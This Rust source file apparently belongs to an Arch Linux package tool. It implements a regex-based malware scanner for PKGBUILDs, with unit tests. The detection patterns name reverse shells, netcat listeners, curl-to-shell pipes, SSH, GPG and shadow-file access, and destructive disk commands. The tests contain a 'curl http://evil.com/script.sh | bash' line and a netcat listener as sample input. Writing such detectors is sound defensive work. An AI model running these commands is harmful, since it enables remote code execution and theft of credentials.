/*
 * pacboost - High-performance Arch Linux package manager frontend.
 * Copyright (C) 2025  compiledkernel-idk and pacboost contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

//! Advanced malware detection for PKGBUILDs.

use regex::Regex;
use std::collections::HashSet;

/// Threat severity level
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ThreatLevel {
    None,
    Low,
    Medium,
    High,
    Critical,
}

/// Individual threat found
#[derive(Debug, Clone)]
pub struct Threat {
    pub level: ThreatLevel,
    pub category: ThreatCategory,
    pub description: String,
    pub line: Option<usize>,
    pub pattern: String,
    pub recommendation: String,
}

/// Categories of threats
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ThreatCategory {
    /// Remote code execution
    RemoteCodeExecution,
    /// Data exfiltration
    DataExfiltration,
    /// Cryptominer
    Cryptominer,
    /// Backdoor
    Backdoor,
    /// Ransomware
    Ransomware,
    /// Privilege escalation
    PrivilegeEscalation,
    /// System destruction
    SystemDestruction,
    /// Persistence
    Persistence,
    /// Network activity
    NetworkActivity,
    /// Obfuscation
    Obfuscation,
}

impl std::fmt::Display for ThreatCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ThreatCategory::RemoteCodeExecution => write!(f, "Remote Code Execution"),
            ThreatCategory::DataExfiltration => write!(f, "Data Exfiltration"),
            ThreatCategory::Cryptominer => write!(f, "Cryptominer"),
            ThreatCategory::Backdoor => write!(f, "Backdoor"),
            ThreatCategory::Ransomware => write!(f, "Ransomware"),
            ThreatCategory::PrivilegeEscalation => write!(f, "Privilege Escalation"),
            ThreatCategory::SystemDestruction => write!(f, "System Destruction"),
            ThreatCategory::Persistence => write!(f, "Persistence"),
            ThreatCategory::NetworkActivity => write!(f, "Network Activity"),
            ThreatCategory::Obfuscation => write!(f, "Obfuscation"),
        }
    }
}

/// Malware scan report
#[derive(Debug, Clone)]
pub struct MalwareReport {
    pub threats: Vec<Threat>,
    pub threat_level: ThreatLevel,
    pub score: u32,
    pub scanned_lines: usize,
}

impl MalwareReport {
    pub fn is_safe(&self) -> bool {
        self.threat_level == ThreatLevel::None || self.threat_level == ThreatLevel::Low
    }
}

/// Pattern definition for threat detection
struct ThreatPattern {
    regex: Regex,
    level: ThreatLevel,
    category: ThreatCategory,
    description: &'static str,
    recommendation: &'static str,
}

/// Malware detector with pattern-based analysis
pub struct MalwareDetector {
    patterns: Vec<ThreatPattern>,
    suspicious_commands: HashSet<&'static str>,
    suspicious_domains: Vec<&'static str>,
}

impl MalwareDetector {
    /// Create a new malware detector with default patterns
    pub fn new() -> Self {
        Self {
            patterns: Self::default_patterns(),
            suspicious_commands: Self::default_suspicious_commands(),
            suspicious_domains: Self::default_suspicious_domains(),
        }
    }

    fn default_patterns() -> Vec<ThreatPattern> {
        vec![
            // Critical - Remote Code Execution
            ThreatPattern {
                regex: Regex::new(r"eval\s+.*\$\(curl").unwrap(),
                level: ThreatLevel::Critical,
                category: ThreatCategory::RemoteCodeExecution,
                description: "Remote code execution via eval+curl",
                recommendation: "Never execute remote code without verification",
            },
            ThreatPattern {
                regex: Regex::new(r"eval\s+.*\$\(wget").unwrap(),
                level: ThreatLevel::Critical,
                category: ThreatCategory::RemoteCodeExecution,
                description: "Remote code execution via eval+wget",
                recommendation: "Never execute remote code without verification",
            },
            ThreatPattern {
                regex: Regex::new(r"curl\s+[^|]*\|\s*(ba)?sh").unwrap(),
                level: ThreatLevel::Critical,
                category: ThreatCategory::RemoteCodeExecution,
                description: "Piping curl output directly to shell",
                recommendation: "Download scripts and review before executing",
            },
            ThreatPattern {
                regex: Regex::new(r"wget\s+[^|]*\|\s*(ba)?sh").unwrap(),
                level: ThreatLevel::Critical,
                category: ThreatCategory::RemoteCodeExecution,
                description: "Piping wget output directly to shell",
                recommendation: "Download scripts and review before executing",
            },

            // Critical - System Destruction
            ThreatPattern {
                regex: Regex::new(r"rm\s+-rf\s+/[a-zA-Z]").unwrap(),
                level: ThreatLevel::Critical,
                category: ThreatCategory::SystemDestruction,
                description: "Destructive rm -rf on system directories",
                recommendation: "Block this package immediately",
            },
            ThreatPattern {
                regex: Regex::new(r":\s*\(\s*\)\s*\{").unwrap(),
                level: ThreatLevel::Critical,
                category: ThreatCategory::SystemDestruction,
                description: "Fork bomb pattern detected",
                recommendation: "Block this package immediately",
            },
            ThreatPattern {
                regex: Regex::new(r"mkfs\s").unwrap(),
                level: ThreatLevel::Critical,
                category: ThreatCategory::SystemDestruction,
                description: "Filesystem formatting command",
                recommendation: "Block unless explicitly needed",
            },
            ThreatPattern {
                regex: Regex::new(r"dd\s+if=.*of=/dev/[a-z]").unwrap(),
                level: ThreatLevel::Critical,
                category: ThreatCategory::SystemDestruction,
                description: "Direct disk write with dd",
                recommendation: "Block unless explicitly needed",
            },

            // High - Cryptominer
            ThreatPattern {
                regex: Regex::new(r"xmrig|xmr-stak|cpuminer|minerd").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::Cryptominer,
                description: "Known cryptominer binary reference",
                recommendation: "Verify if cryptocurrency mining is intended",
            },
            ThreatPattern {
                regex: Regex::new(r"stratum\+tcp://|pool\.(.*)\.(com|net|org)").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::Cryptominer,
                description: "Mining pool connection string",
                recommendation: "Verify if mining is intended functionality",
            },

            // High - Backdoor
            ThreatPattern {
                regex: Regex::new(r"nc\s+-[el]").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::Backdoor,
                description: "Netcat listener (potential backdoor)",
                recommendation: "Review network functionality carefully",
            },
            ThreatPattern {
                regex: Regex::new(r"ncat\s.*-[el]").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::Backdoor,
                description: "Ncat listener (potential backdoor)",
                recommendation: "Review network functionality carefully",
            },
            ThreatPattern {
                regex: Regex::new(r"/dev/tcp/").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::Backdoor,
                description: "Bash /dev/tcp reverse shell pattern",
                recommendation: "Likely malicious - review carefully",
            },

            // High - Data Exfiltration
            ThreatPattern {
                regex: Regex::new(r"~/.ssh").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::DataExfiltration,
                description: "Access to SSH directory",
                recommendation: "Ensure no private keys are being copied",
            },
            ThreatPattern {
                regex: Regex::new(r"\.gnupg").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::DataExfiltration,
                description: "Access to GPG keyring",
                recommendation: "Ensure no private keys are being copied",
            },
            ThreatPattern {
                regex: Regex::new(r"/etc/shadow").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::DataExfiltration,
                description: "Access to shadow password file",
                recommendation: "No legitimate reason to access this file",
            },
            ThreatPattern {
                regex: Regex::new(r"curl.*POST.*-d").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::DataExfiltration,
                description: "HTTP POST with data (potential exfiltration)",
                recommendation: "Verify what data is being sent",
            },

            // High - Privilege Escalation
            ThreatPattern {
                regex: Regex::new(r"chmod\s+[u+]?s").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::PrivilegeEscalation,
                description: "Setting SUID bit",
                recommendation: "Review why elevated privileges needed",
            },
            ThreatPattern {
                regex: Regex::new(r"chmod\s+4[0-7]{3}").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::PrivilegeEscalation,
                description: "Setting SUID permissions",
                recommendation: "Review why elevated privileges needed",
            },

            // High - Persistence
            ThreatPattern {
                regex: Regex::new(r"/etc/cron|crontab").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::Persistence,
                description: "Cron job modification",
                recommendation: "Verify if scheduled task is legitimate",
            },
            ThreatPattern {
                regex: Regex::new(r"~/.bashrc|~/.profile|~/.zshrc").unwrap(),
                level: ThreatLevel::High,
                category: ThreatCategory::Persistence,
                description: "Shell profile modification",
                recommendation: "Verify if shell customization is needed",
            },
            ThreatPattern {
                regex: Regex::new(r"/etc/systemd/system/.*\.service").unwrap(),
                level: ThreatLevel::Medium,
                category: ThreatCategory::Persistence,
                description: "Systemd service installation",
                recommendation: "Review service file contents",
            },

            // Medium - Obfuscation
            ThreatPattern {
                regex: Regex::new(r"base64\s+-d|base64\s+--decode").unwrap(),
                level: ThreatLevel::Medium,
                category: ThreatCategory::Obfuscation,
                description: "Base64 decoding (potential obfuscation)",
                recommendation: "Decode and review the content",
            },
            ThreatPattern {
                regex: Regex::new(r"\\x[0-9a-fA-F]{2}").unwrap(),
                level: ThreatLevel::Medium,
                category: ThreatCategory::Obfuscation,
                description: "Hex-encoded strings",
                recommendation: "Decode and review the content",
            },
            ThreatPattern {
                regex: Regex::new(r"\$\([^)]{100,}\)").unwrap(),
                level: ThreatLevel::Medium,
                category: ThreatCategory::Obfuscation,
                description: "Very long command substitution",
                recommendation: "Review the full command carefully",
            },

            // Medium - Network Activity
            ThreatPattern {
                regex: Regex::new(r"curl\s").unwrap(),
                level: ThreatLevel::Medium,
                category: ThreatCategory::NetworkActivity,
                description: "Network access via curl",
                recommendation: "Verify destination URLs",
            },
            ThreatPattern {
                regex: Regex::new(r"wget\s").unwrap(),
                level: ThreatLevel::Medium,
                category: ThreatCategory::NetworkActivity,
                description: "Network access via wget",
                recommendation: "Verify destination URLs",
            },

            // Low - General suspicious patterns
            ThreatPattern {
                regex: Regex::new(r"rm\s+-rf").unwrap(),
                level: ThreatLevel::Low,
                category: ThreatCategory::SystemDestruction,
                description: "Recursive deletion",
                recommendation: "Verify paths being deleted",
            },
            ThreatPattern {
                regex: Regex::new(r"chmod\s+777").unwrap(),
                level: ThreatLevel::Low,
                category: ThreatCategory::PrivilegeEscalation,
                description: "World-writable permissions",
                recommendation: "Use more restrictive permissions",
            },
        ]
    }

    fn default_suspicious_commands() -> HashSet<&'static str> {
        [
            "rm", "curl", "wget", "nc", "ncat", "netcat", "base64",
            "eval", "exec", "dd", "mkfs", "fdisk", "parted", "cryptsetup",
            "gpg", "openssl", "ssh-keygen", "passwd", "chpasswd",
        ].into_iter().collect()
    }

    fn default_suspicious_domains() -> Vec<&'static str> {
        vec![
            "pastebin.com", "hastebin.com", "paste.ee",
            "transfer.sh", "0x0.st", "file.io",
            "ngrok.io", "serveo.net",
        ]
    }

    /// Scan content for malware patterns
    pub fn scan(&self, content: &str) -> MalwareReport {
        let mut threats = Vec::new();
        let lines: Vec<&str> = content.lines().collect();
        let mut max_level = ThreatLevel::None;

        for (line_num, line) in lines.iter().enumerate() {
            let line_num = line_num + 1;
            let trimmed = line.trim();

            // Skip comments
            if trimmed.starts_with('#') {
                continue;
            }

            // Check patterns
            for pattern in &self.patterns {
                if pattern.regex.is_match(line) {
                    let threat = Threat {
                        level: pattern.level,
                        category: pattern.category,
                        description: pattern.description.to_string(),
                        line: Some(line_num),
                        pattern: pattern.regex.as_str().to_string(),
                        recommendation: pattern.recommendation.to_string(),
                    };

                    if pattern.level > max_level {
                        max_level = pattern.level;
                    }

                    threats.push(threat);
                }
            }

            // Check for suspicious domains
            for domain in &self.suspicious_domains {
                if line.contains(domain) {
                    threats.push(Threat {
                        level: ThreatLevel::Medium,
                        category: ThreatCategory::NetworkActivity,
                        description: format!("Connection to suspicious domain: {}", domain),
                        line: Some(line_num),
                        pattern: domain.to_string(),
                        recommendation: "Verify this URL is legitimate".to_string(),
                    });
                    
                    if max_level < ThreatLevel::Medium {
                        max_level = ThreatLevel::Medium;
                    }
                }
            }
        }

        // Analyze entropy for possible obfuscation
        if let Some(threat) = self.check_entropy(content) {
            if threat.level > max_level {
                max_level = threat.level;
            }
            threats.push(threat);
        }

        // Calculate score (100 = safe, 0 = extremely dangerous)
        let score = self.calculate_score(&threats);

        MalwareReport {
            threats,
            threat_level: max_level,
            score,
            scanned_lines: lines.len(),
        }
    }

    /// Check for high-entropy strings (possible obfuscation)
    fn check_entropy(&self, content: &str) -> Option<Threat> {
        // Look for long strings of random-looking characters
        let high_entropy_pattern = Regex::new(r#"["'][A-Za-z0-9+/=]{64,}["']"#).ok()?;
        
        if high_entropy_pattern.is_match(content) {
            return Some(Threat {
                level: ThreatLevel::Medium,
                category: ThreatCategory::Obfuscation,
                description: "High-entropy string detected (possible encoded payload)".to_string(),
                line: None,
                pattern: "base64-like string".to_string(),
                recommendation: "Decode and review the content".to_string(),
            });
        }

        None
    }

    /// Calculate security score based on threats
    fn calculate_score(&self, threats: &[Threat]) -> u32 {
        let mut score: i32 = 100;

        for threat in threats {
            match threat.level {
                ThreatLevel::Critical => score -= 50,
                ThreatLevel::High => score -= 25,
                ThreatLevel::Medium => score -= 10,
                ThreatLevel::Low => score -= 3,
                ThreatLevel::None => {}
            }
        }

        score.max(0) as u32
    }
}

impl Default for MalwareDetector {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_pkgbuild() {
        let detector = MalwareDetector::new();
        let content = r#"
pkgname=safe-package
pkgver=1.0.0
pkgrel=1

build() {
    make
}

package() {
    make DESTDIR="$pkgdir" install
}
"#;
        let report = detector.scan(content);
        assert!(report.is_safe());
        assert_eq!(report.threat_level, ThreatLevel::None);
        assert_eq!(report.score, 100);
    }

    #[test]
    fn test_critical_threat() {
        let detector = MalwareDetector::new();
        let content = r#"
build() {
    curl http://evil.com/script.sh | bash
}
"#;
        let report = detector.scan(content);
        assert!(!report.is_safe());
        assert_eq!(report.threat_level, ThreatLevel::Critical);
    }

    #[test]
    fn test_high_threat() {
        let detector = MalwareDetector::new();
        let content = r#"
build() {
    nc -l -p 4444
}
"#;
        let report = detector.scan(content);
        assert!(!report.is_safe());
        assert!(report.threat_level >= ThreatLevel::High);
    }

    #[test]
    fn test_medium_threat() {
        let detector = MalwareDetector::new();
        let content = r#"
build() {
    curl http://example.com/file
}
"#;
        let report = detector.scan(content);
        assert_eq!(report.threat_level, ThreatLevel::Medium);
    }

    #[test]
    fn test_score_calculation() {
        let detector = MalwareDetector::new();
        
        // Empty = 100
        assert_eq!(detector.calculate_score(&[]), 100);
        
        // One critical = 50
        let threats = vec![Threat {
            level: ThreatLevel::Critical,
            category: ThreatCategory::RemoteCodeExecution,
            description: "test".to_string(),
            line: None,
            pattern: "test".to_string(),
            recommendation: "test".to_string(),
        }];
        assert_eq!(detector.calculate_score(&threats), 50);
    }
}
